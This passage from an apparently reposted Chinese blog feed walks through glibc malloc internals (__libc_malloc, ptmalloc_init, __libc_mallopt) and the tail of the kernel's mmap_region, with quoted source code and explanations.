prev-&gt;</span>vm_end == addr &amp;&amp;<br>            mpol_equal(vma_policy(prev), policy) &amp;&amp;<br>            can_vma_merge_after(prev, vm_flags,<br>                        anon_vma, file, pgoff)) &#123;<br><br>        <span class="hljs-function"><span class="hljs-title">if</span> (next &amp;&amp; end == next-&gt;</span>vm_start &amp;&amp;<br>                mpol_equal(policy, vma_policy(next)) &amp;&amp;<br>                can_vma_merge_before(next, vm_flags,<br>                    anon_vma, file, pgoff+pglen) &amp;&amp;<br>                <span class="hljs-function"><span class="hljs-title">is_mergeable_anon_vma</span>(prev-&gt;</span>anon_vma,<br>                              <span class="hljs-function"><span class="hljs-title">next</span>-&gt;</span>anon_vma, NULL)) &#123;<br><br>            <span class="hljs-function"><span class="hljs-title">err</span> = vma_adjust(prev, prev-&gt;</span>vm_start,<br>                <span class="hljs-function"><span class="hljs-title">next</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">vm_end</span>, prev-&gt;</span>vm_pgoff, NULL);<br>        &#125; <span class="hljs-keyword">else</span><br>            <span class="hljs-function"><span class="hljs-title">err</span> = vma_adjust(prev, prev-&gt;</span>vm_start,<br>                <span class="hljs-function"><span class="hljs-title">end</span>, prev-&gt;</span>vm_pgoff, NULL);<br>        <span class="hljs-keyword">if</span> (err)<br>            return NULL;<br>        khugepaged_enter_vma_merge(prev, vm_flags);<br>        return prev;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-title">if</span> (next &amp;&amp; end == next-&gt;</span>vm_start &amp;&amp;<br>            mpol_equal(policy, vma_policy(next)) &amp;&amp;<br>            can_vma_merge_before(next, vm_flags,<br>                    anon_vma, file, pgoff+pglen)) &#123;<br>        <span class="hljs-function"><span class="hljs-title">if</span> (prev &amp;&amp; addr &lt; prev-&gt;</span>vm_end)<br>            <span class="hljs-function"><span class="hljs-title">err</span> = vma_adjust(prev, prev-&gt;</span>vm_start,<br>                <span class="hljs-function"><span class="hljs-title">addr</span>, prev-&gt;</span>vm_pgoff, NULL);<br>        <span class="hljs-keyword">else</span>                    <br>            <span class="hljs-function"><span class="hljs-title">err</span> = vma_adjust(area, addr, next-&gt;</span>vm_end,<br>                <span class="hljs-function"><span class="hljs-title">next</span>-&gt;</span>vm_pgoff - pglen, NULL);<br>        <span class="hljs-keyword">if</span> (err)<br>            return NULL;<br>        khugepaged_enter_vma_merge(area, vm_flags);<br>        return area;<br>    &#125;<br><br>    return NULL;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就不详细分析这个函数了，主要通过<code>prev-&gt;vm_end == addr</code>判断即将分配的虚拟内存能否往前合并，通过<code>end == next-&gt;vm_start</code>判断即将分配的虚拟内存能否往后合并。其中，合并函数为<code>vma_adjust</code>。再往下就不分析了。</p><p>回到函数中，假设不能合并，就要通过slab构造一个<code>vm_area_struct</code>结构体，并设置相应的信息，slab是linux内核中分配小块内存的框架。然后通过<code>vma_link</code>插入到进程的红黑树中，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">vma_link</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-keyword">struct</span> vm_area_struct *prev, <span class="hljs-keyword">struct</span> rb_node **rb_link,</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-keyword">struct</span> rb_node *rb_parent)</span></span>&#123;<br><br>    __vma_link(mm, vma, prev, rb_link, rb_parent);<br>    mm-&gt;map_count++;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__vma_link</code>执行实际的插入操作，就是一些红黑树的操作，不往下看了。</p><p>回到<code>mmap_region</code>中，最后通过<code>vma_set_page_prot</code>继续设置一些标志位，然后就返回分配到的虚拟内存的起始地址addr了，该返回值一直向上返回，然后退出系统调用，返回到glibc中。<br>到这里简单总结一下MMAP，其实质就是通过mmap在进程的内存管理结构中的红黑树中分配一块没有使用的虚拟内存。</p><p>下一章继续往下分析glibc中的<code>_int_malloc</code>函数。</p><h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a href="https://introspelliam.github.io/">本文章装载于此</a></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>源码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>malloc源码分析——1</title>
    <link href="/2023/11/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%941/"/>
    <url>/2023/11/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%941/</url>
    
    <content type="html"><![CDATA[<h1 id="malloc源码分析—ptmalloc-init"><a href="#malloc源码分析—ptmalloc-init" class="headerlink" title="malloc源码分析—ptmalloc_init"></a>malloc源码分析—<code>ptmalloc_init</code></h1><p>本文分析malloc的源码，首先从glibc开始，首先看malloc.c文件中的一段定义，</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">strong_alias (<span class="hljs-variable">__libc_malloc</span>, <span class="hljs-variable">__malloc</span>) strong_alias (<span class="hljs-variable">__libc_malloc</span>, malloc)<br></code></pre></td></tr></table></figure><p><code>strong_alias</code>是GNU C中的定义，编译器判定这里malloc是<code>__libc_malloc</code>的别名，<code>__libc_malloc</code>定义在malloc.c中，</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-literal">void</span> * __libc_malloc (size_t <span class="hljs-built_in">bytes</span>)&#123;<br><br>    mstate ar_ptr;<br>    <span class="hljs-literal">void</span> *victim;<br><br>    <span class="hljs-literal">void</span> *(*hook) (size_t, const <span class="hljs-literal">void</span> *) = atomic_forced_read (__malloc_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-built_in">NULL</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">return</span> (*hook)(<span class="hljs-built_in">bytes</span>, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><br>    arena_get (ar_ptr, <span class="hljs-built_in">bytes</span>);<br><br>    victim = _int_malloc (ar_ptr, <span class="hljs-built_in">bytes</span>);<br>    <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-built_in">NULL</span>)&#123;<br>        LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, <span class="hljs-built_in">bytes</span>);<br>        ar_ptr = arena_get_retry (ar_ptr, <span class="hljs-built_in">bytes</span>);<br>        victim = _int_malloc (ar_ptr, <span class="hljs-built_in">bytes</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-built_in">NULL</span>)<br>        (<span class="hljs-literal">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br><br>    <span class="hljs-keyword">return</span> victim;<br>&#125;<br>libc_hidden_def (__libc_malloc)<br></code></pre></td></tr></table></figure><p>首先看<code>atomic_forced_read</code>，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta"># <span class="hljs-keyword">define</span> atomic_forced_read(x) \</span><br><span class="hljs-meta">  (&#123; __typeof (x) __x; __asm (<span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (__x) : <span class="hljs-string">&quot;0&quot;</span> (x)); __x; &#125;)</span><br></code></pre></td></tr></table></figure><p><code>__typeof</code>是原始函数的返回类型，后面是一段汇编代码，”0”是零，即%0，引用时不可以加 %，只能input引用output，这里就是原子读，将<code>__malloc_hook</code>的地址放入任意寄存器(r)再取出。<code>__malloc_hook</code>的定义如下</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">void *weak_variable <span class="hljs-comment">(*__malloc_hook)(size_t __size, const void *)</span> = malloc_hook_ini;<br></code></pre></td></tr></table></figure><p>weak_variable其实就是，</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">__attribute__ ((<span class="hljs-name">weak</span>))<br></code></pre></td></tr></table></figure><p>和编译器有关，这里不管它。<code>__builtin_expect</code>其实就是告诉编译器if判断语句里大多数情况下的值，这样编译器可以做优化，避免过多的跳转。回到<code>__libc_malloc</code>接下来就是调用<code>malloc_hook_ini</code>进行内存的分配。<br><code>malloc_hook_ini</code>定义在hooks.c中，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> * <span class="hljs-title">malloc_hook_ini</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> sz, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *caller)</span></span>&#123;<br>    __malloc_hook = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">ptmalloc_init</span> ();<br>    <span class="hljs-keyword">return</span> __libc_malloc (sz);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ptmalloc-init"><a href="#ptmalloc-init" class="headerlink" title="ptmalloc_init"></a>ptmalloc_init</h2><p>ptmalloc_init用来对整个ptmalloc框架进行初始化，定义在arena.c中，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">ptmalloc_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br><br>    <span class="hljs-keyword">if</span> (__malloc_initialized &gt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>;<br>    __malloc_initialized = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">tsd_key_create</span>(&amp;arena_key, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">tsd_setspecific</span>(arena_key, (<span class="hljs-type">void</span> *) &amp;main_arena);<br>    <span class="hljs-built_in">thread_atfork</span>(ptmalloc_lock_all, ptmalloc_unlock_all, ptmalloc_unlock_all2);<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (__glibc_likely(_environ != <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-type">char</span> **runp = _environ;<br>        <span class="hljs-type">char</span> *envline;<br><br>        <span class="hljs-keyword">while</span> (__builtin_expect((envline = <span class="hljs-built_in">next_env_entry</span>(&amp;runp)) != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-type">size_t</span> len = <span class="hljs-built_in">strcspn</span>(envline, <span class="hljs-string">&quot;=&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> (envline[len] != <span class="hljs-string">&#x27;=&#x27;</span>)<br>                <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">switch</span> (len) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(envline, <span class="hljs-string">&quot;CHECK_&quot;</span>, <span class="hljs-number">6</span>) == <span class="hljs-number">0</span>)<br>                    s = &amp;envline[<span class="hljs-number">7</span>];<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>                <span class="hljs-keyword">if</span> (!__builtin_expect(__libc_enable_secure, <span class="hljs-number">0</span>)) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(envline, <span class="hljs-string">&quot;TOP_PAD_&quot;</span>, <span class="hljs-number">8</span>) == <span class="hljs-number">0</span>)<br>                        __libc_mallopt(M_TOP_PAD, <span class="hljs-built_in">atoi</span>(&amp;envline[<span class="hljs-number">9</span>]));<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(envline, <span class="hljs-string">&quot;PERTURB_&quot;</span>, <span class="hljs-number">8</span>) == <span class="hljs-number">0</span>)<br>                        __libc_mallopt(M_PERTURB, <span class="hljs-built_in">atoi</span>(&amp;envline[<span class="hljs-number">9</span>]));<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br>                <span class="hljs-keyword">if</span> (!__builtin_expect(__libc_enable_secure, <span class="hljs-number">0</span>)) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(envline, <span class="hljs-string">&quot;MMAP_MAX_&quot;</span>, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>)<br>                        __libc_mallopt(M_MMAP_MAX, <span class="hljs-built_in">atoi</span>(&amp;envline[<span class="hljs-number">10</span>]));<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(envline, <span class="hljs-string">&quot;ARENA_MAX&quot;</span>, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>)<br>                        __libc_mallopt(M_ARENA_MAX, <span class="hljs-built_in">atoi</span>(&amp;envline[<span class="hljs-number">10</span>]));<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">10</span>:<br>                <span class="hljs-keyword">if</span> (!__builtin_expect(__libc_enable_secure, <span class="hljs-number">0</span>)) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(envline, <span class="hljs-string">&quot;ARENA_TEST&quot;</span>, <span class="hljs-number">10</span>) == <span class="hljs-number">0</span>)<br>                        __libc_mallopt(M_ARENA_TEST, <span class="hljs-built_in">atoi</span>(&amp;envline[<span class="hljs-number">11</span>]));<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">15</span>:<br>                <span class="hljs-keyword">if</span> (!__builtin_expect(__libc_enable_secure, <span class="hljs-number">0</span>)) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(envline, <span class="hljs-string">&quot;TRIM_THRESHOLD_&quot;</span>, <span class="hljs-number">15</span>) == <span class="hljs-number">0</span>)<br>                        __libc_mallopt(M_TRIM_THRESHOLD, <span class="hljs-built_in">atoi</span>(&amp;envline[<span class="hljs-number">16</span>]));<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(envline, <span class="hljs-string">&quot;MMAP_THRESHOLD_&quot;</span>, <span class="hljs-number">15</span>) == <span class="hljs-number">0</span>)<br>                        __libc_mallopt(M_MMAP_THRESHOLD, <span class="hljs-built_in">atoi</span>(&amp;envline[<span class="hljs-number">16</span>]));<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (s &amp;&amp; s[<span class="hljs-number">0</span>]) &#123;<br>        __libc_mallopt(M_CHECK_ACTION, (<span class="hljs-type">int</span>) (s[<span class="hljs-number">0</span>] - <span class="hljs-string">&#x27;0&#x27;</span>));<br>        <span class="hljs-keyword">if</span> (check_action != <span class="hljs-number">0</span>)<br>            __malloc_check_init();<br>    &#125;<br>    <span class="hljs-built_in">void</span> (*hook)(<span class="hljs-type">void</span>) = <span class="hljs-built_in">atomic_forced_read</span> (__malloc_initialize_hook);<br>    <span class="hljs-keyword">if</span> (hook != <span class="hljs-literal">NULL</span>)<br>        (*hook)();<br>    __malloc_initialized = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先检查全局变量<code>__malloc_initialized</code>是否大于等于0，如果该值大于0，表示ptmalloc已经初始化，如果改值为0，表示ptmalloc正在初始化，全局变量<code>__malloc_initialized</code>用来保证全局只初始化ptmalloc一次。<br><code>tsd_key_create</code>创建线程私有实例<code>arena_key</code>，该私有实例保存的是分配区（arena）的<code>malloc_state</code>实例指针。<code>arena_key</code>指向的可能是主分配区的指针，也可能是非主分配区的指针，这里将调用<code>ptmalloc_init()</code>的线程的<code>arena_key</code>绑定到主分配区上。意味着本线程首选从主分配区分配内存。arena_key在glibc中是一个线程私有变量，</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">tsd_key_create</span>(key, destr)  ((void) (key))<br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">tsd_setspecific</span>(key, data)  __libc_tsd_set (void *, MALLOC, (data))<br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">__libc_tsd_set</span>(TYPE, KEY, VALUE)    (__libc_tsd_##KEY = (VALUE))<br></code></pre></td></tr></table></figure><p><code>tsd_setspecific(arena_key, (void *) &amp;main_arena);</code>就是<code>__libc_tsd_MALLOC = &amp;main_arena</code><br>thread_atfork用来设置进程在fork创建子进程时关于锁设置的各个函数，<code>ptmalloc_lock_all</code>和<code>ptmalloc_unlock_all</code>用来给父进程加锁解锁，<code>ptmalloc_unlock_all2</code>用来给子进程调用以解锁。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment"># define thread_atfork(prepare, parent, child) \</span><br>  atfork_mem.prepare_handler = prepare;                       <span class="hljs-string">\</span><br>  atfork_mem.parent_handler = parent;                         <span class="hljs-string">\</span><br>  atfork_mem.child_handler = child;                       <span class="hljs-string">\</span><br>  atfork_mem.dso_handle = &amp;__dso_handle == NULL ? NULL : __dso_handle;        <span class="hljs-string">\</span><br>  atfork_mem.refcntr = <span class="hljs-number">1</span>;                             <span class="hljs-string">\</span><br>  __linkin_atfork (&amp;atfork_mem)<br></code></pre></td></tr></table></figure><p>其中，<code>atfork_mem</code>是一个全局的fork时的函数子针结构体fork_handler，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ATFORK_MEM static struct fork_handler atfork_mem1</span><br></code></pre></td></tr></table></figure><p><code>__linkin_atfork</code>用于将刚刚构造的fork_handler添加进全局链表<code>__fork_handlers</code>中而不用加锁，其实就是一个CAS锁，关于该锁，可以查阅网上资料，</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe">void attribute_hidden __linkin_atfork(struct fork_handler *<span class="hljs-keyword">new</span><span class="hljs-type">p</span>) &#123;<br>    <span class="hljs-keyword">do</span><br>        <span class="hljs-keyword">new</span><span class="hljs-type">p</span>-&gt;next = __fork_handlers;<br>    <span class="hljs-keyword">while</span> (catomic_compare_and_exchange_bool_acq(&amp;__fork_handlers, <span class="hljs-keyword">new</span><span class="hljs-type">p</span>,<br>            <span class="hljs-keyword">new</span><span class="hljs-type">p</span>-&gt;next) != <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>catomic_compare_and_exchange_bool_acq</code>最后是一个宏定义，将之改写后如下</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&#123;<br>    fork_handler* <span class="hljs-variable">__atg4_old</span> = newp-&gt;next;<br>    long <span class="hljs-variable">__gmemp</span> = &amp;<span class="hljs-variable">__fork_handlers</span>;<br>    ATOMIC();<br>    fork_handler* <span class="hljs-variable">__gret</span> = *<span class="hljs-variable">__gmemp</span>;<br>    fork_handler* <span class="hljs-variable">__gnewval</span> = newp;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">__gret</span> == <span class="hljs-variable">__atg4_old</span>)<br>       *<span class="hljs-variable">__gmemp</span> = newp;<br>    ENDATOMIC();<br>    <span class="hljs-variable">__gret</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>gcc会将这段代码进行编译，生成的代码无法被中断。因此简单说来，<code>__linkin_atfork</code>就是将<code>fork_handler</code>原子添加进全局链表<code>__fork_handlers</code>中。</p><p>回到ptmalloc_init函数中，接下来就是进行环境变量的设置，<code>__glibc_likely</code>和gcc的编译优化相关，不管他。<code>_environ</code>就是<code>__environ</code>，里面保存了环境变量，下面就是根据各个环境变量调用<code>__libc_mallopt</code>进行设置，后面来看这个函数。</p><p><code>ptmalloc_init</code>然后获取<code>__malloc_initialize_hook</code>函数指针并执行，由于该函数和malloc没有直接关系，这里不管它。最后将<code>__malloc_initialized</code>设置为1，表是初始化完成。</p><h2 id="libc-mallopt"><a href="#libc-mallopt" class="headerlink" title="__libc_mallopt"></a>__libc_mallopt</h2><p><code>__libc_mallopt</code>定义在malloc.c中，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> __libc_mallopt(<span class="hljs-type">int</span> param_number, <span class="hljs-type">int</span> value) &#123;<br>    mstate av = &amp;main_arena;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (__malloc_initialized &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">ptmalloc_init</span>();<br>    (<span class="hljs-type">void</span>) <span class="hljs-built_in">mutex_lock</span>(&amp;av-&gt;mutex);<br>    <span class="hljs-built_in">malloc_consolidate</span>(av);<br><br>    <span class="hljs-built_in">LIBC_PROBE</span> (memory_mallopt, <span class="hljs-number">2</span>, param_number, value);<br><br>    <span class="hljs-keyword">switch</span> (param_number) &#123;<br>    <span class="hljs-keyword">case</span> M_MXFAST:<br>        <span class="hljs-keyword">if</span> (value &gt;= <span class="hljs-number">0</span> &amp;&amp; value &lt;= MAX_FAST_SIZE) &#123;<br>            <span class="hljs-built_in">LIBC_PROBE</span> (memory_mallopt_mxfast, <span class="hljs-number">2</span>, value, <span class="hljs-built_in">get_max_fast</span> ());<br>            <span class="hljs-built_in">set_max_fast</span>(value);<br>        &#125; <span class="hljs-keyword">else</span><br>            res = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> M_TRIM_THRESHOLD:<br>        <span class="hljs-built_in">LIBC_PROBE</span> (memory_mallopt_trim_threshold, <span class="hljs-number">3</span>, value,<br>                mp_.trim_threshold, mp_.no_dyn_threshold);<br>        mp_.trim_threshold = value;<br>        mp_.no_dyn_threshold = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> M_TOP_PAD:<br>        <span class="hljs-built_in">LIBC_PROBE</span> (memory_mallopt_top_pad, <span class="hljs-number">3</span>, value,<br>                mp_.top_pad, mp_.no_dyn_threshold);<br>        mp_.top_pad = value;<br>        mp_.no_dyn_threshold = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> M_MMAP_THRESHOLD:<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) value &gt; HEAP_MAX_SIZE / <span class="hljs-number">2</span>)<br>            res = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">LIBC_PROBE</span> (memory_mallopt_mmap_threshold, <span class="hljs-number">3</span>, value,<br>                    mp_.mmap_threshold, mp_.no_dyn_threshold);<br>            mp_.mmap_threshold = value;<br>            mp_.no_dyn_threshold = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> M_MMAP_MAX:<br>        <span class="hljs-built_in">LIBC_PROBE</span> (memory_mallopt_mmap_max, <span class="hljs-number">3</span>, value,<br>                mp_.n_mmaps_max, mp_.no_dyn_threshold);<br>        mp_.n_mmaps_max = value;<br>        mp_.no_dyn_threshold = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> M_CHECK_ACTION:<br>        <span class="hljs-built_in">LIBC_PROBE</span> (memory_mallopt_check_action, <span class="hljs-number">2</span>, value, check_action);<br>        check_action = value;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> M_PERTURB:<br>        <span class="hljs-built_in">LIBC_PROBE</span> (memory_mallopt_perturb, <span class="hljs-number">2</span>, value, perturb_byte);<br>        perturb_byte = value;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> M_ARENA_TEST:<br>        <span class="hljs-keyword">if</span> (value &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">LIBC_PROBE</span> (memory_mallopt_arena_test, <span class="hljs-number">2</span>, value, mp_.arena_test);<br>            